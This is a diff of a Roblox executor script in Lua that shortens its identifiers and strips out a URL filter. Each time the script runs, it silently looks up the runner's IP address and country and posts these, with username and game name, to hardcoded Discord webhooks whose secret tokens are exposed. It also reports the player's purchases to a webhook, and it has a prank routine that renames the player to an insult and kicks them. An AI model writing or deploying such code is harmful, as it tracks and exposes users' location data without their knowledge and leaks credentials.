@@ -4,132 +4,107 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local ExecuteWebhookURL = "https://discord.com/api/webhooks/1247987606407483492/gCrMS46_atvCO5xkM6ecFQGzZt84c9KvUhUnY4hftah9-y6O6lzcPY2l6HDR-PTHVAng"
 local PurchaseWebhookURL = "https://discord.com/api/webhooks/1250811161096618024/48K9A2MM-GxxzP4T-leSyTALMkW-sq8-I7IS0RkEGtAMwED_NYc2YWoxZV4KLYY9n7PL"
 
-local forbiddenWords = {"raid", "attack", "spam"}
-local forbiddenPatterns = {"@[%w_]+", "/%w+"} -- Filtra cualquier cosa que empiece con @ o /
+local forbiddenWords = {"raid", "attack", "spam", "everyone", "here", "@"}
 local prefix = "[LOGGER]"
 
-local function sanitizeMessage(message)
+local function sz(msg)
     for _, word in ipairs(forbiddenWords) do
-        message = message:gsub(word, "[filtered]")
+        msg = msg:gsub(word, "[filtered]")
     end
-    for _, pattern in ipairs(forbiddenPatterns) do
-        message = message:gsub(pattern, "[filtered]")
-    end
-
-    message = message:gsub("https?://[%w-_%.%?%.:/%+=&]+", function(url)
-        if url:match("roblox.com") then
-            return url
-        end
-        return "[filtered]"
-    end)
-
-    return message
+    return msg
 end
 
-local function changeDisplayName(player)
-    local originalName = player.DisplayName
-    local newName = ":v Sean mamon" -- Cambia esto a un nombre gracioso de tu elección
-    player.DisplayName = newName
-    wait(10) 
-    player.DisplayName = originalName
+local function cdn(plr)
+    local origName = plr.DisplayName
+    plr.DisplayName = ":v Sean mamon"
+    wait(10)
+    plr.DisplayName = origName
     game.Players.LocalPlayer:Kick()
 end
 
-local function sendNotificationToDiscord(webhookURL, message)
-    local sanitizedMessage = sanitizeMessage(message)
-    local requestBody = { content = prefix .. " " .. sanitizedMessage }
+local function snd(wb, msg)
+    local sMsg = sz(msg)
+    local reqBody = { content = prefix .. " " .. sMsg }
     local headers = { ["Content-Type"] = "application/json" }
 
     local request = http_request or request or syn.request or http.request
     request({
-        Url = webhookURL,
+        Url = wb,
         Method = "POST",
         Headers = headers,
-        Body = HttpService:JSONEncode(requestBody)
+        Body = HttpService:JSONEncode(reqBody)
     })
 end
 
-local function isInBlacklist(playerId, blacklist)
-    for _, id in ipairs(blacklist) do
-        if playerId == id then
+local function ibl(pid, bl)
+    for _, id in ipairs(bl) do
+        if pid == id then
             return true
         end
     end
     return false
 end
 
-local function downloadBlacklist(url)
+local function dlbl(url)
     local response = game:HttpGet(url)
-    local blacklist = {}
+    local bl = {}
     for id in response:gmatch("(%d+)") do
-        table.insert(blacklist, tonumber(id))
+        table.insert(bl, tonumber(id))
     end
-    return blacklist
+    return bl
 end
 
-local blacklistUrl = "https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/BlackList.lua"
-local blacklist = downloadBlacklist(blacklistUrl)
+local blUrl = "https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/BlackList.lua"
+local bl = dlbl(blUrl)
 
-local playerName = game.Players.LocalPlayer.Name
-local playerId = game.Players.LocalPlayer.UserId
-local localPlayer = game.Players.LocalPlayer
+local plrName = game.Players.LocalPlayer.Name
+local plrId = game.Players.LocalPlayer.UserId
+local lplr = game.Players.LocalPlayer
 
-if not isInBlacklist(playerId, blacklist) then
-    local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-    local gameName = gameInfo and gameInfo.Name or "Unknown Game"
+if not ibl(plrId, bl) then
+    local gInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+    local gName = gInfo and gInfo.Name or "Unknown Game"
     
-    -- Obtener la dirección IP del jugador
-    local ipAddress = game:HttpGet("https://api.ipify.org/")
-    
-    -- Obtener el país basado en la dirección IP
+    local ipAddr = game:HttpGet("https://api.ipify.org/")
     local country = "Unknown"
-    local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
-    if response then
-        country = response
+    local resp = game:HttpGet("https://ipapi.co/" .. ipAddr .. "/country_name")
+    if resp then
+        country = resp
     end
 
-    -- Verificar si el nombre de usuario contiene un patrón prohibido
-    for _, pattern in ipairs(forbiddenPatterns) do
-        if playerName:match(pattern) then
-            changeDisplayName(localPlayer)
-            break
-        end
-    end
-    
-    sendNotificationToDiscord(ExecuteWebhookURL, playerName .. " from " .. country .. " executed the script in game '" .. gameName .. "'.")
+    snd(ExecuteWebhookURL, plrName .. " from " .. country .. " executed the script in game '" .. gName .. "'.")
 else
     warn("You are not allowed to send messages.")
 end
 
-local function handlePurchase(player, productId)
-    local productInfo = MarketplaceService:GetProductInfo(productId)
-    if productInfo then
-        local itemName = productInfo.Name
-        local itemPrice = productInfo.PriceInRobux
-        local itemType = productInfo.ProductType
-        local isCollectible = productInfo.IsLimited or productInfo.IsLimitedUnique
-        local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/" .. game.Name
-        local itemLink = "https://www.roblox.com/catalog/" .. productId
+local function hp(plr, pid)
+    local pInfo = MarketplaceService:GetProductInfo(pid)
+    if pInfo then
+        local iName = pInfo.Name
+        local iPrice = pInfo.PriceInRobux
+        local iType = pInfo.ProductType
+        local isColl = pInfo.IsLimited or pInfo.IsLimitedUnique
+        local iLink = "https://www.roblox.com/catalog/" .. pid
 
-        local message = player.Name .. " bought the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or itemType) .. ") for " .. itemPrice .. " Robux. Item link: " .. itemLink
-        sendNotificationToDiscord(PurchaseWebhookURL, message)
+        local msg = plr.Name .. " bought the item '" .. iName .. "' (" .. (isColl and "Collectible Item" or iType) .. ") for " .. iPrice .. " Robux. Item link: " .. iLink
+        snd(PurchaseWebhookURL, msg)
     end
 end
 
-MarketplaceService.PromptProductPurchaseFinished:Connect(function(player, productId, wasPurchased)
-    if wasPurchased then
-        handlePurchase(player, productId)
+MarketplaceService.PromptProductPurchaseFinished:Connect(function(plr, pid, wp)
+    if wp then
+        hp(plr, pid)
     end
 end)
 
-MarketplaceService.PromptPurchaseFinished:Connect(function(player, productId, wasPurchased)
-    if wasPurchased then
-        handlePurchase(player, productId)
+MarketplaceService.PromptPurchaseFinished:Connect(function(plr, pid, wp)
+    if wp then
+        hp(plr, pid)
     end
 end)
 
-MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
-    if wasPurchased then
-        handlePurchase(player, gamePassId)
+MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(plr, gpid, wp)
+    if wp then
+        hp(plr, gpid)
     end
 end)
